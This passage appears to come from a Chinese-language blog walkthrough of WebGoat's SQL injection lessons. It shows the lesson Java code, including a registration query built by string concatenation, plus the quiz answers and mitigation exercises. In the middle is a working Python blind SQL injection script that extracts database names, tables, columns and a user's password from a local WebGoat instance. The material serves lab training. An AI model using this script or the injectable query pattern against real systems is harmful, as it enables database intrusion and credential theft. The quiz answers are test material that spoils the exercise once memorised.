class="meta">@PutMapping(&quot;/SqlInjectionAdvanced/challenge&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">registerNewUser</span><span class="params">(<span class="meta">@RequestParam</span> String username_reg,<span class="meta">@RequestParam</span> String email_reg,<span class="meta">@RequestParam</span> String password_reg)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">AttackResult</span> <span class="variable">attackResult</span> <span class="operator">=</span> checkArguments(username_reg,email_reg,password_reg);</span><br><span class="line">        <span class="keyword">if</span> (attackResult == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection())&#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">checkUserQuery</span> <span class="operator">=</span> <span class="string">&quot;select userid from sql_challenge_users where userid = &#x27;&quot;</span> + username_reg + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">                <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line">                <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(checkUserQuery);</span><br><span class="line">                <span class="keyword">if</span> (resultSet.next())&#123;</span><br><span class="line">                    <span class="keyword">if</span> (username_reg.contains(<span class="string">&quot;tom&#x27;&quot;</span>))&#123;</span><br><span class="line"><span class="comment">//                        如果 查到了 这个tom&#x27; 就成功</span></span><br><span class="line">                        attackResult = success(<span class="built_in">this</span>).feedback(<span class="string">&quot;user.exists&quot;</span>).build();</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        attackResult = failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;user.exists&quot;</span>).feedbackArgs(username_reg).build();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//                    如果没这个 用户名 就插入</span></span><br><span class="line">                    <span class="type">PreparedStatement</span> <span class="variable">preparedStatement</span> <span class="operator">=</span> connection.prepareStatement(<span class="string">&quot;INSERT INTO sql_challenge_users VALUE (?,?,?)&quot;</span>);</span><br><span class="line">                    preparedStatement.setString(<span class="number">1</span>,username_reg);</span><br><span class="line">                    preparedStatement.setString(<span class="number">2</span>,email_reg);</span><br><span class="line">                    preparedStatement.setString(<span class="number">3</span>,password_reg);</span><br><span class="line">                    attackResult = success(<span class="built_in">this</span>).feedback(<span class="string">&quot;user.created&quot;</span>).feedbackArgs(username_reg).build();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (SQLException e)&#123;</span><br><span class="line">                attackResult = failed(<span class="built_in">this</span>).output(<span class="string">&quot;Something went wrong&quot;</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> attackResult;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> AttackResult <span class="title function_">checkArguments</span><span class="params">(String username_reg, String email_reg, String password_reg)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (StringUtils.isEmpty(username_reg) || StringUtils.isEmpty(email_reg) || StringUtils.isEmpty(password_reg))&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;input.invalid&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (username_reg.length() &gt; <span class="number">250</span> || email_reg.length() &gt; <span class="number">30</span> || password_reg.length()&gt;<span class="number">30</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;input.invalid&quot;</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="SqlInjectionChallengeLogin"><a href="#SqlInjectionChallengeLogin" class="headerlink" title="SqlInjectionChallengeLogin"></a>SqlInjectionChallengeLogin</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.advanced;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.LessonDataSource;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(value = &#123;&quot;SqlInjectionChallengeHint1&quot;, &quot;SqlInjectionChallengeHint2&quot;, &quot;SqlInjectionChallengeHint3&quot;, &quot;SqlInjectionChallengeHint4&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlInjectionChallengeLogin</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> LessonDataSource dataSource;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SqlInjectionChallengeLogin</span><span class="params">(LessonDataSource dataSource)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dataSource = dataSource;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/SqlInjectionAdvanced/challenge_Login&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">login</span><span class="params">(<span class="meta">@RequestParam</span> String username_login, <span class="meta">@RequestParam</span> String password_login)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">var</span> <span class="variable">connection</span> <span class="operator">=</span> dataSource.getConnection()) &#123;</span><br><span class="line">            <span class="type">var</span> <span class="variable">statement</span> <span class="operator">=</span> connection.prepareStatement(<span class="string">&quot;select password from sql_challenge_users where userid = ? and password = ?&quot;</span>);</span><br><span class="line">            statement.setString(<span class="number">1</span>, username_login);</span><br><span class="line">            statement.setString(<span class="number">2</span>, password_login);</span><br><span class="line">            <span class="type">var</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (resultSet.next()) &#123;</span><br><span class="line">                <span class="keyword">return</span> (<span class="string">&quot;tom&quot;</span>.equals(username_login)) ? success(<span class="built_in">this</span>).build()</span><br><span class="line">                        : failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;ResultsButNotTom&quot;</span>).build();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;NoResultsMatched&quot;</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908175309466.png" alt="image-20220908175309466"></p>
<p>简单测试下</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908180524928.png" alt="image-20220908180524928"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908180530962.png" alt="image-20220908180530962"></p>
<p>简单写一下注入脚本</p>
<p>查数据库 通过更改 offset 0 可进行其他数据库获取</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge&quot;</span></span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line"><span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;JSESSIONID=OQWQI54foDP-s9R5KQOXYulZsHMkc8k9F0iCEOEZ; XDEBUG_SESSION=XDEBUG_ECLIPSE; csrftoken=K3MAIhCJRXpvtFDEZL8jPBZBaqB4AQUx5URfXIFuNrZf1FouXjtMPTz8kZT9dpf3; rememberMe=K6J1EzKLEEGRyRq4Dk4GSgMqUEoPYPnI7K2GhLNeSk50azVUvwTHQdT78dE6ZMM0V+2xcbpWgT9m+SALVMYHt7ai6bMTERfZMAU2lHViA6IP4AyXh0eaLyzi0Gc9Va0epahdl6lvGna8/0DgSX1/YIqwFMQ7QFaCAAP1LtE/jkE3TQdk7UNBdvpfHWlMSOgZdJZoYhIGxBhnGJxCVX9E+vB3fcILABQBDKvFpYhlGMNl5LMSA+SyBZCCzGpz2e3MgljifDFgNbSmcwVCfFdGc32h78OWzTcZOCbYbOav2Lp5q7960r2iSNZnaI+aX7xDklYgEgxlL6Q6xtZihscVODPiG9Rcy95G9OsQlLfPycpmS8bYcBrvt3Go0lfFcrGY2Uo6vDxj67hj/73f0VpdgWRfXnk0VPSL9uxElbqjx3GAEU2uKf657Uc3e/DpiVsMwovQUIFTDsm78NdL/E6+ONXKCTHcXp+Vym+6ItYGTKlLvfdZwg9D5JXHrtMjwZJz&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i +=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span>  c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="comment"># 数据库</span></span><br><span class="line">        <span class="comment"># payload =  f&quot;&#x27; or CASE substr((select group_concat(schema_name) from INFORMATION_SCHEMA.SCHEMATA),&#123;i&#125;,1) WHEN &#x27;&#123;chr(c)&#125;&#x27; THEN true ELSE false END-- &quot;</span></span><br><span class="line">        <span class="comment"># 表</span></span><br><span class="line">        payload = <span class="string">f&quot;&#x27; or CASE substr((select group_concat(table_name) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA=&#x27;123456&#x27;),<span class="subst">&#123;i&#125;</span>,1) WHEN &#x27;<span class="subst">&#123;<span class="built_in">chr</span>(c)&#125;</span>&#x27; THEN true ELSE false END-- &quot;</span></span><br><span class="line">        <span class="comment"># 列</span></span><br><span class="line">        payload = <span class="string">f&quot;&#x27; or CASE substr((select group_concat(column_name) from INFORMATION_SCHEMA.columns where TABLE_NAME=&#x27;SQL_CHALLENGE_USERS&#x27;),<span class="subst">&#123;i&#125;</span>,1) WHEN &#x27;<span class="subst">&#123;<span class="built_in">chr</span>(c)&#125;</span>&#x27; THEN true ELSE false END-- &quot;</span></span><br><span class="line">        <span class="comment"># 数据</span></span><br><span class="line">        payload = <span class="string">f&quot;&#x27; or CASE substr((select password from SQL_CHALLENGE_USERS where userid=&#x27;tom&#x27;),<span class="subst">&#123;i&#125;</span>,1) WHEN &#x27;<span class="subst">&#123;<span class="built_in">chr</span>(c)&#125;</span>&#x27; THEN true ELSE false END-- &quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">        <span class="string">&quot;username_reg&quot;</span>:&#123;payload&#125;,</span><br><span class="line">            <span class="string">&quot;email_reg&quot;</span>:<span class="string">&quot;11%4011.com&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password_reg&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;confirm_password_reg&quot;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.put(url=url,headers=header,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;already&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            passwd += <span class="built_in">chr</span>(c)</span><br><span class="line">            <span class="built_in">print</span>(passwd)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908213445711.png" alt="image-20220908213445711"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908213851031.png" alt="image-20220908213851031"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908214114587.png" alt="image-20220908214114587"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908214238156.png" alt="image-20220908214238156"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908214912029.png" alt="image-20220908214912029"></p>
<h4 id="SqlInjectionQuiz"><a href="#SqlInjectionQuiz" class="headerlink" title="SqlInjectionQuiz"></a>SqlInjectionQuiz</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.advanced;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlInjectionQuiz</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    String[] solutions  = &#123;<span class="string">&quot;Solution 4&quot;</span>, <span class="string">&quot;Solution 3&quot;</span>, <span class="string">&quot;Solution 2&quot;</span>, <span class="string">&quot;Solution 3&quot;</span>, <span class="string">&quot;Solution 4&quot;</span>&#125;;</span><br><span class="line">    <span class="type">boolean</span>[] guesses = <span class="keyword">new</span> <span class="title class_">boolean</span>[solutions.length];</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/SqlInjectionAdvanced/quiz&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String[] question_0_solution,</span></span><br><span class="line"><span class="params">                                  <span class="meta">@RequestParam</span> String[] question_1_solution,</span></span><br><span class="line"><span class="params">                                  <span class="meta">@RequestParam</span> String[] question_2_solution,</span></span><br><span class="line"><span class="params">                                  <span class="meta">@RequestParam</span> String[] question_3_solution,</span></span><br><span class="line"><span class="params">                                  <span class="meta">@RequestParam</span> String[] question_4_solution)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">correctAnswers</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        String[] givenAnswers = &#123;question_0_solution[<span class="number">0</span>],question_1_solution[<span class="number">1</span>],question_2_solution[<span class="number">0</span>], question_3_solution[<span class="number">0</span>], question_4_solution[<span class="number">0</span>]&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; solutions.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (givenAnswers[i].contains(solutions[<span class="number">1</span>]))&#123;</span><br><span class="line">                correctAnswers++;</span><br><span class="line">                guesses[i] = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                guesses[i] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (correctAnswers == solutions.length)&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/SqlInjectionAdvanced/quiz&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span>[] getResults()&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.guesses;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>答案 4 3 2 3 4</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908223342069.png" alt="image-20220908223342069"></p>
<h3 id="mitigation"><a href="#mitigation" class="headerlink" title="mitigation"></a>mitigation</h3><h4 id="SqlInjectionMitigations"><a href="#SqlInjectionMitigations" class="headerlink" title="SqlInjectionMitigations"></a>SqlInjectionMitigations</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.mitigation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlInjectionMitigations</span> <span class="keyword">extends</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Category.A3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTitle</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;3.sql.mitigation.title&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="SqlInjectionLesson10a"><a href="#SqlInjectionLesson10a" class="headerlink" title="SqlInjectionLesson10a"></a>SqlInjectionLesson10a</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.mitigation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@AssignmentHints(value = &#123;&quot;SqlStringInjectionHint-mitigation-10a-1&quot;, &quot;SqlStringInjectionHint-mitigation-10a-2&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlInjectionLesson10a</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String [] results =  &#123;<span class="string">&quot;getConnection&quot;</span>, <span class="string">&quot;PreparedStatement&quot;</span>, <span class="string">&quot;prepareStatement&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;setString&quot;</span>, <span class="string">&quot;setString&quot;</span>&#125;;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/SqlInjectionMitigations/attack1a&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String field1, <span class="meta">@RequestParam</span> String field2, <span class="meta">@RequestParam</span> String field3, <span class="meta">@RequestParam</span> String field4, <span class="meta">@RequestParam</span> String field5, <span class="meta">@RequestParam</span> String field6, <span class="meta">@RequestParam</span> String field7)</span> &#123;</span><br><span class="line"></span><br><span class="line">        String[] userInput = &#123;field1,field2,field3,field4,field5,field6,field7&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">position</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">completed</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (String input: userInput)&#123;</span><br><span class="line">            <span class="keyword">if</span> (input.toLowerCase().contains(<span class="built_in">this</span>.results[position].toLowerCase()))&#123;</span><br><span class="line">                completed = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">            position++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (completed)&#123;</span><br><span class="line">            <span class="keyword">return</span> success(<span class="built_in">this</span>).build();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> failed(<span class="built_in">this</span>).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220908230652243.png" alt="image-20220908230652243"></p>
<h4 id="SqlInjectionLesson10b"><a href="#SqlInjectionLesson10b" class="headerlink" title="SqlInjectionLesson10b"></a>SqlInjectionLesson10b</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.lessons.sql_injection.mitigation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentEndpoint;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AssignmentHints;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.assignments.AttackResult;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.tools.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@AssignmentHints(value = &#123;&quot;SqlStringInjectionHint-mitigation-10b-1&quot;, &quot;SqlStringInjectionHint-mitigation-10b-2&quot;, &quot;SqlStringInjectionHint-mitigation-10b-3&quot;, &quot;SqlStringInjectionHint-mitigation-10b-4&quot;, &quot;SqlStringInjectionHint-mitigation-10b-5&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlInjectionLesson10b</span> <span class="keyword">extends</span> <span class="title class_">AssignmentEndpoint</span> &#123;</span><br><span class="line">    <span class="meta">@PostMapping(&quot;/SqlInjectionMitigations/attack10b&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> AttackResult <span class="title function_">completed</span><span class="params">(<span class="meta">@RequestParam</span> String editor)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (editor.isEmpty()) <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.10b.no-code&quot;</span>).build();</span><br><span class="line">            editor = editor.replace(<span class="string">&quot;\\&lt;.*?&gt;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="type">String</span> <span class="variable">regexSetsUpConnection</span> <span class="operator">=</span> <span class="string">&quot;(?=.*getConnection.*)&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">regexUsesPreparedStatement</span> <span class="operator">=</span> <span class="string">&quot;(?=.*PreparedStatement.*)&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">regexUsesPlaceholder</span> <span class="operator">=</span> <span class="string">&quot;(?=.*\\=\\?.*|.*\\=\\s\\?.*)&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">regexUsesSetString</span> <span class="operator">=</span> <span class="string">&quot;(?=.*setString.*)&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">regexUsesExecute</span> <span class="operator">=</span> <span class="string">&quot;(?=.*execute.*)&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">regexUsesExecuteUpdate</span> <span class="operator">=</span> <span class="string">&quot;(?=.*executeUpdate.*)&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">codeline</span> <span class="operator">=</span> editor.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="comment">//            去除 \r \n</span></span><br><span class="line"></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">setsUpConnection</span> <span class="operator">=</span> <span class="built_in">this</span>.check_text(regexSetsUpConnection,codeline);</span><br><span class="line"><span class="comment">//            这里与代码进行正则匹配</span></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">usesPreparedStatement</span> <span class="operator">=</span> <span class="built_in">this</span>.check_text(regexUsesPreparedStatement,codeline);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">useSetString</span> <span class="operator">=</span> <span class="built_in">this</span>.check_text(regexUsesSetString,codeline);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">usesPlaceholder</span> <span class="operator">=</span> <span class="built_in">this</span>.check_text(regexUsesPlaceholder, codeline);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">usesExecute</span> <span class="operator">=</span> <span class="built_in">this</span>.check_text(regexUsesExecute, codeline);</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">usesExecuteUpdate</span> <span class="operator">=</span> <span class="built_in">this</span>.check_text(regexUsesExecuteUpdate, codeline);</span><br><span class="line"></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">hasImportant</span> <span class="operator">=</span> (setsUpConnection &amp;&amp; usesPreparedStatement &amp;&amp; usesPlaceholder &amp;&amp; useSetString &amp;&amp; (usesExecute || usesExecuteUpdate));</span><br><span class="line"><span class="comment">//          如果都正则通过了</span></span><br><span class="line">            List&lt;Diagnostic&gt; hasCompiled = <span class="built_in">this</span>.compileFromString(editor);</span><br><span class="line"><span class="comment">//            返回已编译</span></span><br><span class="line">            <span class="keyword">if</span> (hasImportant &amp;&amp; hasCompiled.size() &lt; <span class="number">1</span>)&#123;</span><br><span class="line"><span class="comment">//                如果已经编译完成并且 没有错误</span></span><br><span class="line">                <span class="keyword">return</span> success(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.10b.success&quot;</span>).build();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (hasCompiled.size()&gt;<span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">//                如果编译有错误</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">errors</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">for</span> (Diagnostic d : hasCompiled)&#123;</span><br><span class="line">                    errors += d.getMessage(<span class="literal">null</span>) + <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.10b.compiler-errors&quot;</span>).output(errors).build();</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> failed(<span class="built_in">this</span>).feedback(<span class="string">&quot;sql-injection.10b.failed&quot;</span>).build();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="keyword">return</span> failed(<span class="built_in">this</span>).output(e.getMessage()).build();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> List&lt;Diagnostic&gt; <span class="title function_">compileFromString</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">JavaCompiler</span> <span class="variable">compiler</span> <span class="operator">=</span> 